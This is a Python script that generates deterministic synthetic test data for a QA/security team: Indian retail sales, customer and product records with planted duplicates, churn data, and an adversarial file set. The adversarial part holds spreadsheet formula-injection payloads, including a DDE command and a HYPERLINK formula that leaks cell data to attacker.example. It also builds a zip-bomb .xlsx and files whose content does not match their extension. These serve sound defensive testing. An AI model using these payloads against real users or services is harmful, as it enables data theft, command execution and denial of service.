#!/usr/bin/env python3
"""NEXORA deterministic synthetic test-data generator (QA/Security-owned). Stdlib only.

    python testdata/generate.py                       # anchor = today, writes testdata/generated/
    python testdata/generate.py --anchor 2026-11-17   # reproducible: same seed + anchor => identical bytes
    python testdata/generate.py --out /tmp/x --only sales churn

All people, companies, products, emails and phone numbers are synthetic. Emails use reserved example domains.
Every dataset is meant to be loaded with classification='synthetic'.

Outputs (see testdata/README.md for the schema of each file):
    sales.csv                     ~5,000 orders over 24 months up to the anchor month (current month included),
                                  INR prices, Diwali/wedding seasonality, a planted anomaly week, a few nulls and
                                  20 exact duplicate rows
    customers_crm.csv / customers_web.csv / customers_ground_truth.csv
    products_supplier_a.csv / products_supplier_b.csv / products_ground_truth.csv
    churn.csv + churn_meta.json   labelled churn data generated from a known logistic model (oracle AUC)
    adversarial/                  malformed.csv, formula_injection.csv, huge_column.csv, wide_columns.csv,
                                  zip_bomb.xlsx, png_as.csv, text_as.xlsx, mz_as.csv
    MANIFEST.json                 seed, anchor, row counts and sha256 of every file
"""

from __future__ import annotations

import argparse
import calendar
import csv
import datetime as dt
import hashlib
import io
import json
import math
import random
import zipfile
from pathlib import Path

SEED = 20261117
HERE = Path(__file__).resolve().parent
DEFAULT_OUT = HERE / "generated"

REGIONS = ["North", "South", "East", "West", "Central"]
REGION_WEIGHTS = [0.24, 0.22, 0.16, 0.26, 0.12]
CHANNELS = ["Online", "Retail", "Distributor", "Marketplace"]
CHANNEL_WEIGHTS = [0.38, 0.30, 0.17, 0.15]
CITIES = {
    "North": ["Delhi", "Chandigarh", "Lucknow", "Jaipur"],
    "South": ["Bengaluru", "Chennai", "Hyderabad", "Kochi"],
    "East": ["Kolkata", "Bhubaneswar", "Patna", "Guwahati"],
    "West": ["Mumbai", "Pune", "Ahmedabad", "Surat"],
    "Central": ["Bhopal", "Indore", "Nagpur", "Raipur"],
}
CITY_ALIASES = {"Bengaluru": "Bangalore", "Mumbai": "Bombay", "Kolkata": "Calcutta", "Chennai": "Madras"}
FIRST = [
    "Aarav",
    "Vivaan",
    "Aditya",
    "Vihaan",
    "Arjun",
    "Sai",
    "Reyansh",
    "Krishna",
    "Ishaan",
    "Rohan",
    "Ananya",
    "Diya",
    "Aadhya",
    "Saanvi",
    "Pari",
    "Myra",
    "Anika",
    "Kavya",
    "Meera",
    "Riya",
    "Kabir",
    "Dhruv",
    "Nikhil",
    "Pranav",
    "Tanvi",
    "Nisha",
    "Pooja",
    "Sneha",
    "Harsh",
    "Yash",
]
LAST = [
    "Sharma",
    "Verma",
    "Patel",
    "Iyer",
    "Nair",
    "Reddy",
    "Gupta",
    "Mehta",
    "Shah",
    "Joshi",
    "Desai",
    "Kulkarni",
    "Banerjee",
    "Chatterjee",
    "Das",
    "Rao",
    "Menon",
    "Pillai",
    "Singh",
    "Kapoor",
]
EMAIL_DOMAINS = ["example.com", "example.org", "example.net", "mail.example.test"]

# (category, product, base INR price, unit, pack size)
CATALOG = [
    ("Grocery", "Basmati Rice", 649.0, "kg", 5),
    ("Grocery", "Toor Dal", 189.0, "kg", 1),
    ("Grocery", "Sunflower Oil", 899.0, "l", 5),
    ("Grocery", "Masala Chai", 349.0, "g", 500),
    ("Grocery", "Atta Flour", 299.0, "kg", 5),
    ("Grocery", "Cashew Nuts", 499.0, "g", 500),
    ("Electronics", "Bluetooth Earbuds", 1999.0, "pc", 1),
    ("Electronics", "Smart Watch", 3499.0, "pc", 1),
    ("Electronics", "Power Bank 10000mAh", 1299.0, "pc", 1),
    ("Electronics", "LED Bulb 9W", 129.0, "pc", 1),
    ("Electronics", "Wi-Fi Router", 2499.0, "pc", 1),
    ("Electronics", "USB-C Cable", 299.0, "pc", 1),
    ("Apparel", "Cotton Kurta", 899.0, "pc", 1),
    ("Apparel", "Silk Saree", 4999.0, "pc", 1),
    ("Apparel", "Denim Jeans", 1499.0, "pc", 1),
    ("Apparel", "Sports Shoes", 2799.0, "pair", 1),
    ("Home", "Pressure Cooker 5L", 2199.0, "pc", 1),
    ("Home", "Steel Tiffin Box", 599.0, "pc", 1),
    ("Home", "Cotton Bedsheet", 999.0, "pc", 1),
    ("Home", "Ceiling Fan", 2899.0, "pc", 1),
    ("Beauty", "Herbal Shampoo", 249.0, "ml", 340),
    ("Beauty", "Sunscreen SPF50", 449.0, "ml", 100),
    ("Beauty", "Ayurvedic Face Cream", 399.0, "g", 50),
    ("Beauty", "Hair Oil", 199.0, "ml", 200),
]
# Month multipliers: festive peak (Sep-Nov: Navratri/Diwali), wedding season (Dec-Feb), monsoon dip (Jul-Aug)
SEASONALITY = {
    1: 1.05,
    2: 1.0,
    3: 0.95,
    4: 0.9,
    5: 0.92,
    6: 0.88,
    7: 0.8,
    8: 0.85,
    9: 1.15,
    10: 1.45,
    11: 1.4,
    12: 1.1,
}


# ------------------------------------------------------------------------------------------- helpers
def _rng(name: str) -> random.Random:
    """Independent, stable stream per dataset (adding a dataset never shifts another one)."""
    return random.Random(f"{SEED}:{name}")


def _month_add(d: dt.date, months: int) -> dt.date:
    y, m = divmod(d.month - 1 + months, 12)
    return dt.date(d.year + y, m + 1, 1)


def _write_csv(path: Path, header: list[str], rows: list[list]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(header)
        w.writerows(rows)
    return len(rows)


def _person(rng: random.Random, idx: int) -> dict:
    first, last = rng.choice(FIRST), rng.choice(LAST)
    region = rng.choices(REGIONS, REGION_WEIGHTS)[0]
    return {
        "person_id": f"P{idx:05d}",
        "first": first,
        "last": last,
        "email": f"{first.lower()}.{last.lower()}{idx}@{rng.choice(EMAIL_DOMAINS)}",
        "phone": f"9{rng.randint(100000000, 999999999)}",
        "city": rng.choice(CITIES[region]),
        "region": region,
        "dob": dt.date(1960, 1, 1) + dt.timedelta(days=rng.randint(0, 365 * 40)),
    }


# ------------------------------------------------------------------------------------------- sales
def gen_sales(out: Path, anchor: dt.date, n_orders: int = 5000) -> dict:
    rng = _rng("sales")
    start = _month_add(anchor.replace(day=1), -23)  # 24 months incl. the anchor month
    months = [_month_add(start, i) for i in range(24)]
    weights = []
    for i, m in enumerate(months):
        trend = 1.0 + 0.012 * i  # ~1.2 %/month growth
        weights.append(
            SEASONALITY[m.month] * trend * (0.5 if m == months[-1] else 1.0)
        )  # anchor month partial
    customers = [_person(rng, i) for i in range(1, 801)]
    # planted anomaly: one week with a 4x spike in Electronics/Online (to be found by anomaly detection)
    anomaly_month = months[-7]
    anomaly_days = {anomaly_month + dt.timedelta(days=d) for d in range(9, 16)}

    rows: list[list] = []
    for i in range(1, n_orders + 1):
        m = rng.choices(months, weights)[0]
        last_day = calendar.monthrange(m.year, m.month)[1]
        if m == months[-1]:
            last_day = min(last_day, anchor.day)
        day = m + dt.timedelta(days=rng.randint(0, last_day - 1))
        cust = rng.choice(customers)
        cat, prod, price, _unit, _pack = rng.choice(CATALOG)
        channel = rng.choices(CHANNELS, CHANNEL_WEIGHTS)[0]
        qty = rng.choices([1, 2, 3, 4, 5, 10], [50, 22, 12, 7, 6, 3])[0]
        if day in anomaly_days and i % 3 == 0:
            cat, prod, price, channel = "Electronics", "Smart Watch", 3499.0, "Online"
            qty *= 4
        unit_price = round(price * rng.uniform(0.95, 1.08), 2)
        discount = rng.choices([0.0, 0.05, 0.1, 0.15, 0.2], [55, 15, 15, 10, 5])[0]
        revenue = round(qty * unit_price * (1 - discount), 2)
        rows.append(
            [
                f"ORD-{anchor.year}-{i:06d}",
                day.isoformat(),
                cust["person_id"].replace("P", "C"),
                f"{cust['first']} {cust['last']}",
                cust["region"],
                prod,
                cat,
                qty,
                f"{unit_price:.2f}",
                f"{discount:.2f}",
                f"{revenue:.2f}",
                channel,
            ]
        )
    rows.sort(key=lambda r: (r[1], r[0]))
    # a few nulls (realistic gaps): customer_name, region, discount, channel
    for col in (3, 4, 9, 11):
        for idx in rng.sample(range(len(rows)), 6):
            rows[idx][col] = ""
    # 20 exact duplicate rows (double-submitted orders)
    dups = [list(rows[idx]) for idx in rng.sample(range(len(rows)), 20)]
    for d in dups:
        rows.insert(rng.randint(0, len(rows)), d)
    header = [
        "order_id",
        "order_date",
        "customer_id",
        "customer_name",
        "region",
        "product",
        "category",
        "quantity",
        "unit_price",
        "discount",
        "revenue",
        "channel",
    ]
    _write_csv(out / "sales.csv", header, rows)
    return {
        "rows": len(rows),
        "unique_orders": n_orders,
        "exact_duplicates": 20,
        "currency": "INR",
        "date_min": min(r[1] for r in rows),
        "date_max": max(r[1] for r in rows),
        "anomaly_week": [min(anomaly_days).isoformat(), max(anomaly_days).isoformat()],
    }


# ------------------------------------------------------------------------------------------- customers
def _typo(rng: random.Random, s: str) -> str:
    if len(s) < 4:
        return s
    i = rng.randint(1, len(s) - 2)
    op = rng.choice(["swap", "drop", "double"])
    if op == "swap":
        return s[:i] + s[i + 1] + s[i] + s[i + 2 :]
    if op == "drop":
        return s[:i] + s[i + 1 :]
    return s[:i] + s[i] + s[i:]


def _phone_variant(rng: random.Random, p: str) -> str:
    return rng.choice([f"+91 {p[:5]} {p[5:]}", f"0{p}", f"+91-{p}", f"{p[:3]}-{p[3:6]}-{p[6:]}", p])


def gen_customers(out: Path) -> dict:
    rng = _rng("customers")
    people = [_person(rng, i) for i in range(1, 701)]
    crm_people = rng.sample(people, 500)
    crm_ids = {p["person_id"]: f"CRM-{i:05d}" for i, p in enumerate(crm_people, 1)}
    overlap = rng.sample(crm_people, 350)
    web_only = [p for p in people if p["person_id"] not in crm_ids][:100]
    web_people = overlap + web_only
    rng.shuffle(web_people)

    crm_rows = []
    for p in crm_people:
        crm_rows.append(
            [
                crm_ids[p["person_id"]],
                p["first"],
                p["last"],
                p["email"],
                p["phone"],
                p["city"],
                p["dob"].isoformat(),
                f"{rng.uniform(1000, 250000):.2f}",
            ]
        )
    web_rows, truth = [], []
    for i, p in enumerate(web_people, 1):
        web_id = f"WEB-{i:05d}"
        name = f"{p['first']} {p['last']}"
        r = rng.random()
        if r < 0.25:
            name = _typo(rng, name)
        elif r < 0.4:
            name = name.upper()
        elif r < 0.5:
            name = f"{p['last']}, {p['first']}"
        email = p["email"]
        if rng.random() < 0.3:
            email = email.upper() if rng.random() < 0.5 else email.replace(".", "", 1)
        city = CITY_ALIASES.get(p["city"], p["city"]) if rng.random() < 0.5 else p["city"]
        signup = dt.date(2023, 1, 1) + dt.timedelta(days=rng.randint(0, 1000))
        web_rows.append(
            [
                web_id,
                name,
                email,
                _phone_variant(rng, p["phone"]),
                city,
                signup.isoformat(),
                rng.choice(["newsletter", "organic", "ads", "referral"]),
            ]
        )
        truth.append([p["person_id"], crm_ids.get(p["person_id"], ""), web_id])
    for p in crm_people:
        if p not in web_people:
            truth.append([p["person_id"], crm_ids[p["person_id"]], ""])
    truth.sort()
    _write_csv(
        out / "customers_crm.csv",
        [
            "crm_id",
            "first_name",
            "last_name",
            "email",
            "phone",
            "city",
            "date_of_birth",
            "lifetime_value_inr",
        ],
        crm_rows,
    )
    _write_csv(
        out / "customers_web.csv",
        ["web_id", "full_name", "email", "mobile", "city", "signup_date", "source"],
        web_rows,
    )
    _write_csv(out / "customers_ground_truth.csv", ["person_id", "crm_id", "web_id"], truth)
    return {
        "crm_rows": len(crm_rows),
        "web_rows": len(web_rows),
        "true_matches": len(overlap),
        "people": len({t[0] for t in truth}),
    }


# ------------------------------------------------------------------------------------------- products
def gen_products(out: Path) -> dict:
    rng = _rng("products")
    brands = ["Sunrise", "Kesar", "Nilgiri", "Ganga", "Sahyadri", "Vindhya", "Konark", "Thar"]
    masters = []
    for i in range(1, 201):
        cat, prod, price, unit, pack = rng.choice(CATALOG)
        brand = rng.choice(brands)
        masters.append(
            {
                "master_id": f"M{i:04d}",
                "brand": brand,
                "name": prod,
                "category": cat,
                "unit": unit,
                "pack": pack,
                "price": round(price * rng.uniform(0.8, 1.3), 2),
            }
        )
    unit_convert = {"kg": ("g", 1000), "l": ("ml", 1000), "g": ("kg", 0.001), "ml": ("l", 0.001)}
    a_rows, b_rows, truth = [], [], []
    a_items = rng.sample(masters, 170)
    b_items = rng.sample(masters, 160)
    a_skus = {}
    for n, m in enumerate(a_items, 1):
        sku = f"A-{m['category'][:3].upper()}-{n:04d}"
        a_skus[m["master_id"]] = sku
        a_rows.append(
            [
                sku,
                f"{m['brand']} {m['name']} {m['pack']}{m['unit']}",
                m["category"],
                m["unit"],
                m["pack"],
                f"{m['price']:.2f}",
                f"89{rng.randint(10**10, 10**11 - 1)}",
            ]
        )
    b_skus = {}
    for n, m in enumerate(b_items, 1):
        sku = f"SB/{n:05d}-{rng.choice('XYZ')}"
        b_skus[m["master_id"]] = sku
        unit, pack = m["unit"], m["pack"]
        if unit in unit_convert and rng.random() < 0.5:
            unit, factor = unit_convert[unit]
            pack = round(pack * factor, 3)
        name = f"{m['name'].upper()} ({m['brand']}) {pack} {unit.upper()}"
        if rng.random() < 0.2:
            name = _typo(rng, name)
        b_rows.append(
            [
                sku,
                name,
                m["category"].lower(),
                f"{pack:g}",
                unit.upper(),
                f"{m['price'] * rng.uniform(0.97, 1.05):.2f}",
                rng.choice(["Y", "N"]),
            ]
        )
    for m in masters:
        truth.append(
            [
                m["master_id"],
                a_skus.get(m["master_id"], ""),
                b_skus.get(m["master_id"], ""),
                f"{m['brand']} {m['name']}",
                m["category"],
                m["unit"],
                m["pack"],
            ]
        )
    _write_csv(
        out / "products_supplier_a.csv",
        ["sku", "product_name", "category", "unit", "pack_size", "mrp_inr", "ean"],
        a_rows,
    )
    _write_csv(
        out / "products_supplier_b.csv",
        ["item_code", "description", "cat", "qty_per_pack", "uom", "price", "in_stock"],
        b_rows,
    )
    _write_csv(
        out / "products_ground_truth.csv",
        [
            "master_id",
            "supplier_a_sku",
            "supplier_b_item_code",
            "canonical_name",
            "category",
            "unit",
            "pack_size",
        ],
        truth,
    )
    both = sum(1 for t in truth if t[1] and t[2])
    return {
        "masters": len(masters),
        "supplier_a": len(a_rows),
        "supplier_b": len(b_rows),
        "true_matches": both,
    }


# ------------------------------------------------------------------------------------------- churn
CHURN_COEF = {
    "intercept": -1.2,
    "tenure_months": -0.045,
    "monthly_spend_k": -0.18,
    "support_tickets": 0.42,
    "days_since_login": 0.035,
    "plan_basic": 0.55,
    "nps": -0.09,
}


def _auc(scores: list[float], labels: list[int]) -> float:
    pairs = sorted(zip(scores, labels, strict=True))
    rank_sum, n_pos, i = 0.0, sum(labels), 0
    while i < len(pairs):
        j = i
        while j < len(pairs) and pairs[j][0] == pairs[i][0]:
            j += 1
        avg_rank = (i + j + 1) / 2  # 1-based average rank for ties
        rank_sum += avg_rank * sum(lbl for _s, lbl in pairs[i:j])
        i = j
    n_neg = len(labels) - n_pos
    return (rank_sum - n_pos * (n_pos + 1) / 2) / (n_pos * n_neg)


def gen_churn(out: Path, n: int = 3000) -> dict:
    rng = _rng("churn")
    rows, probs, labels = [], [], []
    for i in range(1, n + 1):
        tenure = rng.randint(1, 72)
        spend = round(rng.lognormvariate(7.3, 0.6), 2)  # INR / month
        tickets = min(int(rng.expovariate(0.7)), 12)
        login = rng.randint(0, 90)
        plan = rng.choices(["basic", "standard", "premium"], [0.45, 0.35, 0.2])[0]
        nps = rng.randint(0, 10)
        z = (
            CHURN_COEF["intercept"]
            + CHURN_COEF["tenure_months"] * tenure
            + CHURN_COEF["monthly_spend_k"] * spend / 1000
            + CHURN_COEF["support_tickets"] * tickets
            + CHURN_COEF["days_since_login"] * login
            + CHURN_COEF["plan_basic"] * (plan == "basic")
            + CHURN_COEF["nps"] * nps
        )
        p = 1 / (1 + math.exp(-z))
        y = 1 if rng.random() < p else 0
        probs.append(p)
        labels.append(y)
        rows.append(
            [
                f"CUST-{i:05d}",
                tenure,
                f"{spend:.2f}",
                tickets,
                login,
                plan,
                nps,
                rng.choices(REGIONS, REGION_WEIGHTS)[0],
                y,
            ]
        )
    _write_csv(
        out / "churn.csv",
        [
            "customer_id",
            "tenure_months",
            "monthly_spend_inr",
            "support_tickets",
            "days_since_login",
            "plan",
            "nps",
            "region",
            "churned",
        ],
        rows,
    )
    meta = {
        "model": "logistic",
        "coefficients": CHURN_COEF,
        "rows": n,
        "positive_rate": round(sum(labels) / n, 4),
        "oracle_auc": round(_auc(probs, labels), 4),
        "note": "oracle_auc uses the TRUE probabilities: a trained model should approach but not exceed it",
    }
    (out / "churn_meta.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")
    return meta


# ------------------------------------------------------------------------------------------- adversarial
FORMULA_PAYLOADS = [
    "=1+1",
    "=cmd|' /C calc'!A0",
    "+SUM(1,2)",
    "-2+3",
    "@SUM(A1:A2)",
    "\t=1+1",
    "\r=1+1",
    '=HYPERLINK("http://attacker.example/?x="&A1,"click")',
    '=IMPORTXML(CONCAT("http://x.example/",A2),"//a")',
    "-10",  # a plain negative number is NOT a formula
]

_XLSX_CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    "</Types>"
)
_XLSX_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    "</Relationships>"
)
_XLSX_WORKBOOK = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
)
_XLSX_WB_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    "</Relationships>"
)


def _fixed_zipinfo(name: str) -> zipfile.ZipInfo:
    zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))  # fixed timestamp => byte-identical output
    zi.compress_type = zipfile.ZIP_DEFLATED
    zi.external_attr = 0o644 << 16
    return zi


def write_zip_bomb_xlsx(path: Path, uncompressed_mb: int = 64) -> dict:
    """A structurally valid .xlsx whose sheet expands ~1000:1 (well above the ratio-100 guard)."""
    row = '<row><c t="inlineStr"><is><t>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</t></is></c></row>'
    target = uncompressed_mb * 1024 * 1024
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr(_fixed_zipinfo("[Content_Types].xml"), _XLSX_CONTENT_TYPES)
        zf.writestr(_fixed_zipinfo("_rels/.rels"), _XLSX_RELS)
        zf.writestr(_fixed_zipinfo("xl/workbook.xml"), _XLSX_WORKBOOK)
        zf.writestr(_fixed_zipinfo("xl/_rels/workbook.xml.rels"), _XLSX_WB_RELS)
        with zf.open(_fixed_zipinfo("xl/worksheets/sheet1.xml"), "w", force_zip64=True) as sheet:
            head = b'<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
            sheet.write(head)
            chunk = (row * 4096).encode()
            written = len(head)
            while written < target:
                sheet.write(chunk)
                written += len(chunk)
            sheet.write(b"</sheetData></worksheet>")
    with zipfile.ZipFile(path) as zf:
        total = sum(i.file_size for i in zf.infolist())
    size = path.stat().st_size
    return {"compressed_bytes": size, "uncompressed_bytes": total, "ratio": round(total / size, 1)}


def gen_adversarial(out: Path) -> dict:
    adv = out / "adversarial"
    adv.mkdir(parents=True, exist_ok=True)
    rng = _rng("adversarial")

    # malformed.csv: ragged rows, unclosed quote, stray delimiter, NUL, invalid UTF-8, BOM, CRLF/LF mix
    malformed = io.BytesIO()
    malformed.write(b"\xef\xbb\xbforder_id,region,revenue\r\n")
    malformed.write(b"1,North,100.00\n")
    malformed.write(b"2,South\n")  # too few fields
    malformed.write(b"3,East,300.00,EXTRA,FIELDS\r\n")  # too many fields
    malformed.write(b'4,"West,400.00\n')  # unclosed quote swallows the next line
    malformed.write(b"5,Central,5\x0000.00\n")  # NUL byte
    malformed.write(b"6,\xff\xfeNorth,600.00\n")  # invalid UTF-8
    malformed.write(b"7;South;700.00\n")  # wrong delimiter
    malformed.write(b"8,North,not-a-number\n")
    (adv / "malformed.csv").write_bytes(malformed.getvalue())

    with (adv / "formula_injection.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["id", "customer_name", "note", "amount_inr"])
        for i, payload in enumerate(FORMULA_PAYLOADS, 1):
            w.writerow([i, f"Synthetic Customer {i}", payload, f"{rng.uniform(10, 999):.2f}"])

    huge = "A" * (1024 * 1024 + 1)  # one cell just over 1 MiB (compresses to ~1 KB in git)
    with (adv / "huge_column.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["id", "payload", "region"])
        w.writerow([1, huge, "North"])
        w.writerow([2, "small", "South"])

    with (adv / "wide_columns.csv").open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow([f"col_{i:04d}" for i in range(2000)])
        w.writerow([str(i) for i in range(2000)])

    bomb = write_zip_bomb_xlsx(adv / "zip_bomb.xlsx")
    # wrong magic bytes: content does not match the extension
    (adv / "png_as.csv").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(rng.randrange(256) for _ in range(256)))
    (adv / "text_as.xlsx").write_bytes(b"order_id,region\n1,North\n")  # not a zip
    (adv / "mz_as.csv").write_bytes(
        b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 120 + b"This program cannot be run"
    )
    return {"zip_bomb": bomb, "formula_payloads": len(FORMULA_PAYLOADS)}


# ------------------------------------------------------------------------------------------- main
GENERATORS = {
    "sales": lambda out, anchor: gen_sales(out, anchor),
    "customers": lambda out, anchor: gen_customers(out),
    "products": lambda out, anchor: gen_products(out),
    "churn": lambda out, anchor: gen_churn(out),
    "adversarial": lambda out, anchor: gen_adversarial(out),
}


def _sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as fh:
        for block in iter(lambda: fh.read(1 << 20), b""):
            h.update(block)
    return h.hexdigest()


def generate(out: Path = DEFAULT_OUT, anchor: dt.date | None = None, only: list[str] | None = None) -> dict:
    anchor = anchor or dt.date.today()
    out.mkdir(parents=True, exist_ok=True)
    stats = {name: fn(out, anchor) for name, fn in GENERATORS.items() if not only or name in only}
    files = sorted(p for p in out.rglob("*") if p.is_file() and p.name != "MANIFEST.json")
    manifest = {
        "seed": SEED,
        "anchor": anchor.isoformat(),
        "stats": stats,
        "files": {
            p.relative_to(out).as_posix(): {"bytes": p.stat().st_size, "sha256": _sha256(p)} for p in files
        },
    }
    if not only:
        (out / "MANIFEST.json").write_text(
            json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
    return manifest


def main(argv: list[str] | None = None) -> None:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--out", type=Path, default=DEFAULT_OUT)
    ap.add_argument("--anchor", type=dt.date.fromisoformat, default=None, help="YYYY-MM-DD (default: today)")
    ap.add_argument("--only", nargs="*", choices=sorted(GENERATORS))
    args = ap.parse_args(argv)
    manifest = generate(args.out, args.anchor, args.only)
    for name, info in manifest["files"].items():
        print(f"{info['bytes']:>12,}  {name}")


if __name__ == "__main__":
    main()
